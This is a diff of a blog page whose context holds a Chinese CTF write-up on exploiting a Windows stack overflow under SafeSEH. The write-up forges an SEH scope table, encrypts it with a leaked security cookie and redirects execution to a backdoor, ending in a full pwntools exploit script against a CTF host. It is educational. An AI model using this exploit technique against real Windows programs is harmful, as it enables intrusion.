@@ -5,34 +5,34 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="用IDA分析一下，栈溢出漏洞   但是程序结尾不能ret，直接exit了   我们注意到，程序开始时，注册了SHE处理">
 <meta property="og:type" content="article">
 <meta property="og:title" content="(windows SEH利用)babystack">
-<meta property="og:url" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/index.html">
+<meta property="og:url" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="用IDA分析一下，栈溢出漏洞   但是程序结尾不能ret，直接exit了   我们注意到，程序开始时，注册了SHE处理">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image6.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image2.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image3.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image4.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image5.png">
+<meta property="og:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image6.png">
 <meta property="article:published_time" content="2020-07-26T14:51:11.000Z">
 <meta property="article:modified_time" content="2025-06-26T02:38:45.560Z">
 <meta property="article:author" content="ha1vk">
@@ -40,9 +40,9 @@
 <meta property="article:tag" content="windows漏洞利用">
 <meta property="article:tag" content="异常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/">
+<link rel="canonical" href="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/">
 
 
 <script id="page-configurations">
@@ -104,7 +104,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -125,27 +125,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -203,10 +203,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -241,7 +241,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -264,17 +264,17 @@
 
       
         <p>用IDA分析一下，栈溢出漏洞</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png" class="">
 
 <p>但是程序结尾不能ret，直接exit了</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image2.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image2.png" class="">
 
 <p>我们注意到，程序开始时，注册了SHE处理</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image3.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image3.png" class="">
 
 <p>当程序发生异常，比如访问非法地址时，将造成异常，如果程序有注册SHE异常处理，则使用相关的handler来处理异常。</p>
 <p>push offset stru_403688压入了一个结构体地址，这个结构体是SEH SCOPE TABLE，它的结构如下</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image4.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image4.png" class="">
 
 <p>其中我们注意到里面有两个函数指针，如果我们能够伪造一个这样的结构体，并把函数指针指向后门函数，就可以达到目的。</p>
 <p><code>push offset __except_handler4</code>压入了一个异常处理的handler，如果程序没有开启SAFE SHE，那么我们不需要伪造SEH SCOPE TABLE，直接覆盖这个handler指针为后门函数地址即可，但是如果开启了SAFE SHE，那么程序会检测hanlder是否在某一个合法的范围内，就如glibc下面的vtable范围检查一样。因此，在SAFE SHE下，我们可以通过伪造SEH SCOPE TABLE来达到利用。</p>
@@ -283,10 +283,10 @@
 
 <p>从__except_handler4源码中，我们看到，我们只需要伪造好了*FilterFunc，*即可执行相应的函数。</p>
 <p>xor [ebp+ms_exc.registration.ScopeTable], eax会将栈里的SHE ScopeTable指针与___security_cookie进行加密，因此，我们伪造SHE ScopeTable指针时，也需要加密一遍。我们仅需要修改栈里scopeTbale指针，而不要把其他的SHE帧里其他的给改了，<strong>sehFrame</strong> 的结构如下</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image5.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image5.png" class="">
 
 <p>大小为0x18，从IDA的F5中也可以发现</p>
-<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image6.png" class="">
+<img src="/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image6.png" class="">
 
 <p>从__except_handler4的源码中看到，还有一个ValidateLocalCookies函数对cookie的验证，类似于linux下的canary验证，我们只需要调试，确定好其位置，然后计算其值，写入即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;192.168.232.1&#x27;,6666)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26098</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">addr</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Do you want to know more?&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Where do you want to know&#x27;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;value is &#x27;</span>)</span><br><span class="line">   data = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;stack address = &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;main address = &#x27;</span>)</span><br><span class="line">exe_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\r\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x10B0</span></span><br><span class="line">backdoor = exe_base + <span class="number">0x138D</span></span><br><span class="line">security_cookie_addr = exe_base + <span class="number">0x4004</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exe_base=&#x27;</span>,<span class="built_in">hex</span>(exe_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;backdoor=&#x27;</span>,<span class="built_in">hex</span>(backdoor)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;security_cookie_addr=&#x27;</span>,<span class="built_in">hex</span>(security_cookie_addr)</span><br><span class="line">security_cookie = get_data(security_cookie_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;security_cookie=&#x27;</span>,<span class="built_in">hex</span>(security_cookie)</span><br><span class="line"><span class="comment">#伪造SEH SCOPE TABLE</span></span><br><span class="line">SEH_scope_table = p32(<span class="number">0xFFFFFFE4</span>) <span class="comment">#GSCookieOffset</span></span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>) <span class="comment">#GSCookieXorOffset</span></span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>) <span class="comment">#EHCookieOffset</span></span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>) <span class="comment">#EHCookieXorOffset</span></span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>) <span class="comment">#EncloseingLevel</span></span><br><span class="line">SEH_scope_table += p32(backdoor) <span class="comment">#FilterFunc，伪造为后门函数地址</span></span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>) <span class="comment">#HandlerFunc</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + SEH_scope_table</span><br><span class="line">fake_SEH_scope_table_addr = stack_addr + <span class="number">0x10</span></span><br><span class="line">payload= payload.ljust(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p32((stack_addr + <span class="number">0x9C</span>) ^ security_cookie) <span class="comment">#ValidateLocalCookies的校验</span></span><br><span class="line"><span class="comment">#CPPEH_RECORD结构体</span></span><br><span class="line">payload += p32(stack_addr - <span class="number">0x44</span>) <span class="comment">#esp</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(stack_addr + <span class="number">0xD4</span>) <span class="comment">#Next</span></span><br><span class="line">payload += p32(exe_base + <span class="number">0x1460</span>) <span class="comment">#ExceptionHandler</span></span><br><span class="line">payload += p32(fake_SEH_scope_table_addr ^ security_cookie) <span class="comment">#Scope Table</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#TryLevel</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Do you want to know more?&#x27;</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Do you want to know more?&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Where do you want to know&#x27;</span>,<span class="string">&#x27;1&#x27;</span>) <span class="comment">#地址异常触发SEH调用我们的后门函数</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -298,9 +298,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
-              <a href="/ha1vk/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
-              <a href="/ha1vk/tags/%E5%BC%82%E5%B8%B8/" rel="tag"># 异常</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
+              <a href="/tags/%E5%BC%82%E5%B8%B8/" rel="tag"># 异常</a>
           </div>
 
         
@@ -309,11 +309,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" rel="prev" title="ASIS_2017_Babyheap_Windows_unlink">
+    <a href="/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" rel="prev" title="ASIS_2017_Babyheap_Windows_unlink">
       <i class="fa fa-chevron-left"></i> ASIS_2017_Babyheap_Windows_unlink
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/08/16/watevr-2019-5x5-lightsout/" rel="next" title="watevr_2019_5x5_lightsout">
+    <a href="/2020/08/16/watevr-2019-5x5-lightsout/" rel="next" title="watevr_2019_5x5_lightsout">
       watevr_2019_5x5_lightsout <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -385,20 +385,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -471,30 +471,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
